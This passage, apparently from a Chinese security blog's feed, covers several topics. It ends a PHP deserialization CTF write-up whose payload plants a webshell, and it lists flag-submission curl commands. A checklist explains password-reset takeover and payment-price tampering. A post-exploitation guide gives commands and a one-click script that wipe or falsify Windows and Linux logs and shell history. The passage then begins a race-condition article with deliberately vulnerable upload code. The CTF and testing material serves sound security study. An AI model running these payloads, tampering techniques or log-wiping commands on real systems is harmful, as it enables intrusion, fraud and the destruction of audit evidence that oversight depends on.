class="hljs-variable">$badions</span>[<span class="hljs-number">1</span>] ) &#123;<br>         <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;a&#x27;</span> :<br>         <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;O&#x27;</span> :<br>         <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span> :<br>             <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>( <span class="hljs-string">&quot;/^<span class="hljs-subst">&#123;$badions[1]&#125;</span>:[0-9]+:.*[;&#125;]\$/s&quot;</span>, <span class="hljs-variable">$data</span> ) )<br>                 <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>             <span class="hljs-keyword">break</span>;<br>         <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span> :<br>         <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;i&#x27;</span> :<br>         <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span> :<br>             <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>( <span class="hljs-string">&quot;/^<span class="hljs-subst">&#123;$badions[1]&#125;</span>:[0-9.E-]+;\$/&quot;</span>, <span class="hljs-variable">$data</span> ) )<br>                 <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>             <span class="hljs-keyword">break</span>;<br>     &#125;<br>     <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br> &#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>]))&#123;<br><span class="hljs-variable">$post_data</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_serialized</span>(<span class="hljs-variable">$post_data</span>))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$post_data</span>;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$post_data</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$post_data</span>.<span class="hljs-string">&quot;,Your resume scored &quot;</span>.<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">60</span>,<span class="hljs-number">100</span>).<span class="hljs-string">&quot; points&quot;</span>;<br>&#125;<br><br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;请输入你的名字&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// $class4 = new chybeta();</span><br><span class="hljs-comment">// $class4-&gt;test = &#x27;&#x27;;</span><br><span class="hljs-comment">// $class4_ser = serialize($class4);</span><br><span class="hljs-comment">// print_r($class4_ser);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>代码中被注释的就是exp，直接去掉注释运行即可</p><p>思路：chybeta函数中，fwrite函数向log.php内容写入$test,而$test参数的内容可控，可以写入webshell</p><p>POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">chybeta</span></span>&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&#x27;pcaq&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">chybeta</span>(<span class="hljs-string">&#x27;&lt;?php system(&quot;cat /flag&quot;); ?&gt;&#x27;</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">#O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;?php system(&quot;cat /flag&quot;); ?&gt;&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">POST /common/cacf.php HTTP/<span class="hljs-number">1.1</span><br>name=O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;chybeta&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;&lt;?php system(&#x27;cat /flag&#x27;); ?&gt;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>直接访问url/common/log.php即可获得flag</p><h2 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /flag<br><br>Header<br>Content-Type: application/json<br>Authorization: 61b12ec24b3497753f6d950e1ed098a8<br>Body<br>&#123;<span class="hljs-string">&quot;flag&quot;</span>: <span class="hljs-string">&quot;your_flag_here&quot;</span>&#125;<br><br><br>curl -X POST http://120.46.139.120:19999/api/flag -H <span class="hljs-string">&quot;Authorization: 61b12ec24b3497753f6d950e1ed098a8&quot;</span> -d <span class="hljs-string">&quot;&#123; \&quot;flag\&quot;: \&quot;your_flag_here\&quot; &#125;&quot;</span><br></code></pre></td></tr></table></figure><p>2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Users\DELL&gt;curl -X POST http://120.46.139.120:19999/api/flag -H <span class="hljs-string">&quot;Authorization: 61b12ec24b3497753f6d950e1ed098a8&quot;</span> -d <span class="hljs-string">&quot;&#123; \&quot;flag\&quot;: \&quot;flag&#123;c81fb60c62e04fc6f6d468b47ababd8484bf19f6&#125;\&quot; &#125;&quot;</span><br>&#123;<span class="hljs-string">&quot;error&quot;</span>:40307,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;Wrong Flag!&quot;</span>&#125;<br><br>C:\Users\DELL&gt;curl -X POST http://120.46.139.120:19999/api/flag -H <span class="hljs-string">&quot;Authorization: 61b12ec24b3497753f6d950e1ed098a8&quot;</span> -d <span class="hljs-string">&quot;&#123; \&quot;flag\&quot;: \&quot;flag&#123;80b00df1a3d5d621199268f92f02d40c5681a230&#125;\&quot; &#125;&quot;</span><br>&#123;<span class="hljs-string">&quot;data&quot;</span>:<span class="hljs-string">&quot;Submit Succeeded!&quot;</span>,<span class="hljs-string">&quot;error&quot;</span>:0,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;success&quot;</span>&#125;<br><br>C:\Users\DELL&gt;curl -X POST http://120.46.139.120:19999/api/flag -H <span class="hljs-string">&quot;Authorization: 61b12ec24b3497753f6d950e1ed098a8&quot;</span> -d <span class="hljs-string">&quot;&#123; \&quot;flag\&quot;: \&quot;flag&#123;c8aad79a1f305e0ee549f733d73327efc3154d8f&#125;\&quot; &#125;&quot;</span><br>&#123;<span class="hljs-string">&quot;data&quot;</span>:<span class="hljs-string">&quot;Submit Succeeded!&quot;</span>,<span class="hljs-string">&quot;error&quot;</span>:0,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;success&quot;</span>&#125;<br><br>C:\Users\DELL&gt;curl -X POST http://120.46.139.120:19999/api/flag -H <span class="hljs-string">&quot;Authorization: 61b12ec24b3497753f6d950e1ed098a8&quot;</span> -d <span class="hljs-string">&quot;&#123; \&quot;flag\&quot;: \&quot;flag&#123;c8aad79a1f305e0ee549f733d73327efc3154d8f&#125;\&quot; &#125;&quot;</span><br>&#123;<span class="hljs-string">&quot;error&quot;</span>:40309,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;Please DON&#x27;T Submit Flag Repeatedly.&quot;</span>&#125;<br><br>C:\Users\DELL&gt;curl -X POST http://120.46.139.120:19999/api/flag -H <span class="hljs-string">&quot;Authorization: 61b12ec24b3497753f6d950e1ed098a8&quot;</span> -d <span class="hljs-string">&quot;&#123; \&quot;flag\&quot;: \&quot;flag&#123;c8aad79a1f305e0ee549f733d73327efc3154d8f&#125;\&quot; &#125;&quot;</span><br>&#123;<span class="hljs-string">&quot;error&quot;</span>:40309,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;Please DON&#x27;T Submit Flag Repeatedly.&quot;</span>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试逻辑漏洞总结</title>
    <link href="/posts/1020619168/"/>
    <url>/posts/1020619168/</url>
    
    <content type="html"><![CDATA[<h2 id="验证机制"><a href="#验证机制" class="headerlink" title="验证机制"></a>验证机制</h2><p>**<br>**</p><h3 id="登陆处"><a href="#登陆处" class="headerlink" title="登陆处"></a>登陆处</h3><p>返回包中有验证码</p><p>返回页面 hidden中有验证码</p><p>有些其他登陆url中不需要验证码</p><p>验证码不变，验证码没有一个完整的服务请求，只在刷新url时才变</p><p>第一次请求包验证了验证码是否正确，第二次请求不需要验证</p><p>拦截登录时验证码的刷新请求，第一次验证码未失效，可绕过</p><p>验证码和用户名、密码是否一次同时提交</p><h3 id="忘记密码"><a href="#忘记密码" class="headerlink" title="忘记密码"></a>忘记密码</h3><hr><p>***</p><p>先确定web中有忘记密码或者能实现此类功能的点</p><p>使用受控制的账户执行一次完成的正常顺序，（建议画流程图）主要为了了解机制</p><p>如果恢复机制用质询，确定用户是否能够设定或选择他们自己的质询和响应，若用户可以设定或选择自己的质询与响应，使用一组已知账户获取正确质询，然后找出易猜测的响应质询</p><p>若恢复机制中使用密码暗示，可以参考上一段方法</p><p>若恢复申请中目标给你发了包含恢复URL的邮件，可以大量获取这种邮件，试图确定其他用户的恢复链接，或者分析会话牌</p><h3 id="记住我"><a href="#记住我" class="headerlink" title="记住我"></a>记住我</h3><p>查看所有的记住我功能，确定应用程序是记住用户名还是用户名和密码还是密码，还是仍然要求用户在随后的访问中输入密码。若采用后一种设置(仍然要求用户在随后的访问中输入密码）就不太可能存在这个漏洞</p><p>查看程序的cookie是否是持久性，以及其他本地存储机制的持久性数据，如IE的userData，seilverlight的隔离存储等，看是否有包含明显的用户或者可预测的用户标识</p><p>修改持久cookie的内容，根据具体情况让程序认为另一个用户已经保存在你本地</p><h2 id="验证机制执行缺陷"><a href="#验证机制执行缺陷" class="headerlink" title="验证机制执行缺陷"></a>验证机制执行缺陷</h2><h3 id="开放登录机制"><a href="#开放登录机制" class="headerlink" title="开放登录机制*** ***"></a>开放登录机制*** ***</h3><p>使用控制的一个帐户执行一次完整型，有效的登录。使用拦截代理服务器记录提交每一份请求和响应</p><p>进行多次登录，以非正常的方式修改请求，eg：对于客户端传送的每一个参数或者cookie：</p><p>1.提交一个空字符</p><p>2.删除名、值</p><p>3.提交相反的字符串代替数字</p><p>检查提交的每个响应的差异</p><h3 id="session会话"><a href="#session会话" class="headerlink" title="session会话"></a>session会话</h3><p>**<br>**</p><p>f12中firebug中的session是在不断变化，一般会用作验证用户的身份和标识</p><h3 id="session接口篡改"><a href="#session接口篡改" class="headerlink" title="session接口篡改"></a>session接口篡改</h3><hr><p>***</p><p>准备两个账号，一个a账号一个b账号，b为受害者，a为攻击者。来到密码重置的地方，先输入a账号，然后发送验证码，等到有出现重新发送验证码的时候然后开bp再次点击重新发送验证码输入抓包，然后把包里的a账号改成b账号，然后放包然后这个验证码就会到攻击者那里（也就是a账号）这样你就可以重置受害者账号（也就是b账号）</p><h3 id="session覆盖攻击"><a href="#session覆盖攻击" class="headerlink" title="session覆盖攻击"></a>session覆盖攻击</h3><p>利用Session生成并会覆盖上一个会话的特点，先使用攻击者的Session绕过业务系统的限制，然后将Session覆盖成目标的Session，从原有的业务点上进行敏感操作，从而伪造目标身份，完成危险操作，被称为Session覆盖攻击</p><p>攻击者在找回密码处输入自己的账号，然后点击发送验证码，输入验证码</p><p>验证码验证成功，跳转到设置新密码处</p><p>攻击者新建一个浏览器标签卡，并在新建的标签卡重新打开找回密码的链接</p><p>输入目标的账号，点击发送验证码</p><p>回到攻击者设置新密码的标签卡，F5刷新</p><p>设置新密码，点击确认，成功更改目标密码</p><p>**<br>**</p><h2 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h2><h3 id="验证码不合理"><a href="#验证码不合理" class="headerlink" title="验证码不合理"></a>验证码不合理</h3><p>缺少对时间和错误次数限制，导致可枚举验证码，一般对4位数字验证码进行枚举;图片验证码补充</p><p>密码错误后前端向后端重新获取新的验证码，前端拦截获取新的验证码请求，使其旧验证码不过期，可以辅以暴力破解</p><p>密码错误后前端向后端重新获取新的验证码，前端拦截获取新的验证码请求，使其旧验证码不过期，可以辅以暴力破解</p><h3 id="客户端验证"><a href="#客户端验证" class="headerlink" title="客户端验证"></a>客户端验证</h3><p>前端js判断验证码是否正确</p><h3 id="修改请求信息"><a href="#修改请求信息" class="headerlink" title="修改请求信息"></a>修改请求信息</h3><p>通过修改自己密码，然后替换请求中对应用户的例如: user、id值，即可修改他人密码</p><p>例如请求body ,遍历Userid字段即可批量重置，如果后端校验可尝试替换会话信息如cookie和token进行绕过</p><p>Userid:1&amp;Pwd:123456</p><h3 id="弱凭证"><a href="#弱凭证" class="headerlink" title="弱凭证"></a>弱凭证</h3><hr><p>***</p><p>如有些业务是通过发送邮件进行密码重置的，可以通过对凭证用户id或时间戳进行枚举凭证重置越权其他人的密码一种场景知道用户名和用户号就可以对该用户进行密码重置，重置后的密码通过邮件发送，可以通过暴力破解用户名和用户号进行任意密码重置，只是重置后的密码无</p><h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><h3 id="横向"><a href="#横向" class="headerlink" title="横向"></a>横向</h3><p>指的是权限平级的两个用户之间的越权访问。<br>比如，一个正常的用户A通常只能够对自己的一些信息进行增删改查，但是由于程序员的一时疏忽未对信息进行增删改查的时候进行一个判断，判断所需要操作的信息是否属于对应的用户，因此，导致用户A可以操作其他人的信息。</p><p>包含了用户标识且可控</p><h3 id="纵向"><a href="#纵向" class="headerlink" title="纵向"></a>纵向</h3><p>指的是权限不等的两个用户之间的越权访问。</p><p>一般都是，低权限的用户可以直接访问高权限的用户的信息</p><p>一般有权限标识</p><h2 id="支付逻辑"><a href="#支付逻辑" class="headerlink" title="支付逻辑"></a>支付逻辑</h2><h3 id="签约"><a href="#签约" class="headerlink" title="签约"></a>签约</h3><p>首先这个活动要有标识，如：一个账号只有一次福利/新人….，这种才可以</p><p>首先用a设备登录跳转到支付页面这时先不要支付，再用b设备登录同样的账号也停留在活动的支付页，然后a，b两个设备一起支付。就是等于一个东西充值了2个月或者其他，超出了活动规定</p><h3 id="价格修改"><a href="#价格修改" class="headerlink" title="价格修改"></a>价格修改</h3><hr><p>***</p><p>在请求包中包含了你所购买的价格然后修改价格放包</p><h3 id="数量"><a href="#数量" class="headerlink" title="数量"></a>数量</h3><hr><p>***</p><p>你买一个物品，包里包含了你购买的数量试着把数量改成负数，如果价格变少或者免费，则okk</p><h3 id="支付状态"><a href="#支付状态" class="headerlink" title="支付状态"></a>支付状态</h3><hr><p>***</p><p>没有对支付状态的值跟实际订单支付状态进行校验，导致点击支付时抓包修改决定支付或未支付的参数为支付状态的值从而达到支付成功</p><h3 id="优惠券、积分"><a href="#优惠券、积分" class="headerlink" title="优惠券、积分"></a>优惠券、积分</h3><p>如果优惠券、折扣券、积分等可以换取相应的物品，那么也有可能出现支付漏洞，这个流程与一般支付流程类似，可以尝试挖掘。</p><p>修改优惠劵金额</p><p>具体看优惠券的兑换方式，如果的是满减型，那么就尝试修改优惠券的金额、修改商品价格。如果是折扣类型，那么就尝试折扣程度。</p><p>修改优惠劵金额及业务逻辑问题</p><p>具体看优惠券的业务逻辑，比如说，如果支付价格为0时，会报错，提示购买失败，这是因为网站后台不允许提交0元的商品购买订单。</p><p>修改积分金额</p><p>修改积分金额与上面几点类似，同样是抓包判断能不能修改相关信息。</p><h3 id="多重替换支付"><a href="#多重替换支付" class="headerlink" title="多重替换支付"></a>多重替换支付</h3><p>支付过程中，网站没有验证商品价格和用户的支付价格。首先去产生两个订单，这两个订单商品是不一样的，其价格不一样，如果服务端没有做好这相关的验证，那么在支付的过程当中抓包，修改其订单值为另一个订单值，最后支付，这时就可以用订单一的支付价格买到订单的商品</p><hr><p>***</p><h3 id="重复支付"><a href="#重复支付" class="headerlink" title="重复支付"></a>重复支付</h3><p>一些交易市场有一类似于试用牌子或者其它，这个试用牌子可以依靠签到获得，而这个牌子的作用可以去试用一些商品，在你进行试用的时候会扣掉你的试用牌子，当你试用完成或者主动取消试用时，试用牌子会返回到账户当中。如果没有进行对订单多重提交的校验，那么就可导致无限制刷牌子，比如，你试用时抓包，然后你每次试用都会产生一个订单号，然后利用刚抓到的数据包进行批量提交，你就可以看到每次提交的订单号不一样，然后这时你再看订单可以看到同一个商品的无数订单，但试用牌子数只扣了你第一个试验时的牌子数，那么这时你申请批量退出试用，那么这么多订单，每退一个就会退相应的</p><p>牌子数量到账户当中，这就构成了无限制刷得问题</p><hr><p>***</p><h3 id="值为最大值支付"><a href="#值为最大值支付" class="headerlink" title="值为最大值支付"></a>值为最大值支付</h3><p>以前也是看到过相关的例子，一些网站比如你购买商品，这里有2个思路修改值，1是直接修改支付金额值为最大值，比如999999999，或者修改附属值，如优惠卷，积分等为999999999，如果这里逻辑设计有问题，那么其支付金额会变为0</p><h3 id="无限制试用"><a href="#无限制试用" class="headerlink" title="无限制试用"></a>无限制试用</h3><p>一些网站的一些商品，比如云系列产品支持试用，试用时期一般为7天或者30天，一个账户只能试用一次，试用期间不能再试用，但如果这个试用接口没做好分配那么很容易导致问题的发生</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逻辑漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>后渗透阶段清理痕迹方式总结</title>
    <link href="/posts/468889284/"/>
    <url>/posts/468889284/</url>
    
    <content type="html"><![CDATA[<h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p>有远程桌面权限时手动删除日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">开始-程序-管理工具-计算机管理-系统工具-事件查看器-清除日志<br></code></pre></td></tr></table></figure><p>wevtutil</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">wevtutil el             列出系统中所有日志名称<br>wevtutil cl system      清理系统日志<br>wevtutil cl application 清理应用程序日志<br>wevtutil cl security    清理安全日志<br></code></pre></td></tr></table></figure><p>meterperter自带清除日志功能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">clearev     清除windows中的应用程序日志、系统日志、安全日志<br></code></pre></td></tr></table></figure><p>清除recent</p><p>在文件资源管理器中点击“查看”-&gt;“选项”-&gt;在常规-&gt;隐私中点击”清除”按钮</p><p>或直接打开C:\Users\Administrator\Recent并删除所有内容</p><p>或在命令行中输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">del /f /s /q “%userprofile%\Recent*.*<br></code></pre></td></tr></table></figure><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="清除命令历史记录"><a href="#清除命令历史记录" class="headerlink" title="清除命令历史记录"></a>清除命令历史记录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">histroy -r          <span class="hljs-comment">#删除当前会话历史记录</span><br><span class="hljs-built_in">history</span> -c          <span class="hljs-comment">#删除内存中的所有命令历史</span><br><span class="hljs-built_in">rm</span> .bash_history   <span class="hljs-comment">#删除历史文件中的内容</span><br>HISTZISE=0          <span class="hljs-comment">#通过设置历史命令条数来清除所有历史记录</span><br></code></pre></td></tr></table></figure><h3 id="linux日志文件"><a href="#linux日志文件" class="headerlink" title="linux日志文件"></a>linux日志文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">/var/run/utmp 记录现在登入的用户<br>/var/log/wtmp 记录用户所有的登入和登出<br>/var/log/lastlog 记录每一个用户最后登入时间<br>/var/log/btmp 记录错误的登入尝试<br>/var/log/auth.log 需要身份确认的操作<br>/var/log/secure 记录安全相关的日志信息<br>/var/log/maillog 记录邮件相关的日志信息<br>/var/log/message 记录系统启动后的信息和错误日志<br>/var/log/cron 记录定时任务相关的日志信息<br>/var/log/spooler 记录UUCP和news设备相关的日志信息<br>/var/log/boot.log 记录守护进程启动和停止相关的日志消息<br></code></pre></td></tr></table></figure><p>完全删除日志文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /dev/null &gt; filename<br>: &gt; filename<br>&gt; filename<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; filename<br><span class="hljs-built_in">echo</span> &gt; filename<br></code></pre></td></tr></table></figure><p>针对性删除日志文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">删除当天日志<br>sed  -i <span class="hljs-string">&#x27;/当天日期/&#x27;</span>d  filename<br></code></pre></td></tr></table></figure><p>篡改日志文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">将所有170.170.64.17ip替换为127.0.0.1<br>sed -i <span class="hljs-string">&#x27;s/170.170.64.17/127.0.0.1/g&#x27;</span><br></code></pre></td></tr></table></figure><p>一键清除脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/bin/bash</span><br><span class="hljs-built_in">echo</span> &gt; /var/log/syslog<br><span class="hljs-built_in">echo</span> &gt; /var/log/messages<br><span class="hljs-built_in">echo</span> &gt; /var/log/httpd/access_log<br><span class="hljs-built_in">echo</span> &gt; /var/log/httpd/error_log<br><span class="hljs-built_in">echo</span> &gt; /var/log/xferlog<br><span class="hljs-built_in">echo</span> &gt; /var/log/secure<br><span class="hljs-built_in">echo</span> &gt; /var/log/auth.log<br><span class="hljs-built_in">echo</span> &gt; /var/log/user.log<br><span class="hljs-built_in">echo</span> &gt; /var/log/wtmp<br><span class="hljs-built_in">echo</span> &gt; /var/log/lastlog<br><span class="hljs-built_in">echo</span> &gt; /var/log/btmp<br><span class="hljs-built_in">echo</span> &gt; /var/run/utmp<br><span class="hljs-built_in">rm</span> ~/./bash_history<br><span class="hljs-built_in">history</span> -c<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>后渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅析条件竞争漏洞</title>
    <link href="/posts/3233264749/"/>
    <url>/posts/3233264749/</url>
    
    <content type="html"><![CDATA[<p>@<a href="%E7%9B%AE%E5%BD%95">TOC</a></p><h2 id="0x00-条件竞争"><a href="#0x00-条件竞争" class="headerlink" title="0x00-条件竞争"></a>0x00-条件竞争</h2><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的。开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果，简而言之就是并没有考虑线程同步。因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p><h2 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01-基础知识"></a>0x01-基础知识</h2><p>先来了解一下关于条件竞争的基础知识</p><p><strong>条件竞争</strong>：<br>系统中，最小的运算调度单位是线程，而每个线程又依附于一个进程，条件竞争则是多进程 或多线程对一个共享资源操作，因为操作顺序不受控的时候所产生的问题。</p><p><strong>进程</strong>：<br>进程是为了更好的利用CPU的资源；进程是系统进行资源分配和调度的一个独立单位；每个进程都有自己的独立内存空间，不同进程 通过进程间通信来通信；由于进程比较重要，占据独立的内存，所以上 下文进程间的切换开销（栈、寄存器、虚拟内 存、文件句柄等）比较大，但相对比较稳定安 全。</p><p><strong>线程</strong>：<br>线程的是为了降低上下文切换的消耗，提高系 统的并发性，并突破一个进程只能干一样事的 缺陷，使到进程内并发成为可能。 线程是进程的一个实体,是CPU调度和分派的基 本单位,它是比进程更小的能独立运行的基本单 位。线程自己基本上不拥有系统资源,只拥有一点在 运行中必不可少的资源(如程序计数器,一组寄 存器和栈),但是它可与同属一个进程的其他的 线程共享进程所拥有的全部资源。 线程间通信主要通过共享内存，上下文切换很快，资源开销较少，但相比进程不够稳定容易 丢失数据。<br><strong>Session：</strong><br>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。</p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02-漏洞分析"></a>0x02-漏洞分析</h2><p>攻击者不断的发起访问请求访问该文件，该文件一旦被执行，就会在服务器上生成一个恶意的shell文件</p><p>首先上传一个php文件，然后检测文件后缀名，如果不符合条件，就删掉，虽然php代码在执行的时候是线性执行代码的，但是执行的时候可以有多个线程。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&#x27;.&#x27;</span>) + <span class="hljs-number">1</span>);   <span class="hljs-comment">#后缀</span><br><br><span class="hljs-variable">$path</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span> . <span class="hljs-variable">$filename</span>;<br><span class="hljs-variable">$tmp</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp</span>, <span class="hljs-variable">$path</span>))&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/php/i&#x27;</span>, <span class="hljs-variable">$ext</span>))&#123;   <span class="hljs-comment">#判断后缀是否为php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;upload success,file in &#x27;</span>.<span class="hljs-variable">$path</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$path</span>);    <span class="hljs-comment">#已经上传后判断若是PHP则删除</span><br><span class="hljs-keyword">die</span>(<span 